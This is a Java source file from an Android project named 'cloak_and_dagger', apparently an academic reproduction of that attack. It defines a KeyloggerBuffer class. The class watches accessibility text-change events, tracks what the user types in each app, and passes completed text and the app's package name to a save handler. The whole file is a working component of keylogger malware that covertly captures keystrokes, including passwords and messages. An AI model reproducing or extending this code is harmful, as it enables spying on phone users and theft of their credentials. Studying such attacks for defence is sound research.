package pl.edu.agh.sarna.cloak_and_dagger;

import android.view.accessibility.AccessibilityEvent;

public class KeyloggerBuffer {

    private String currentPackageName;

    private String currentText;

    public interface OnSaveHandler {
        void onSave(String text, String packageName);
    }

    private OnSaveHandler onSaveHandler;

    public KeyloggerBuffer(OnSaveHandler onSaveHandler) {
        this.onSaveHandler = onSaveHandler;
    }

    private boolean shouldSaveCurrentState(String newPackageName, String newText) {
        return currentPackageName != null && currentText != null
                && (!newPackageName.equals(currentPackageName)
                || (!newText.startsWith(currentText) && !currentText.startsWith(newText)));
    }

    private void updateState(String newPackageName, String newText) {
        if (shouldSaveCurrentState(newPackageName, newText)) {
            onSaveHandler.onSave(currentText, currentPackageName);
        }
        currentPackageName = newPackageName;
        currentText = newText;
    }

    public void updateState(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                || event.getText().size() != 1) {
            return;
        }
        updateState(event.getPackageName().toString(), event.getText().get(0).toString());
    }

}

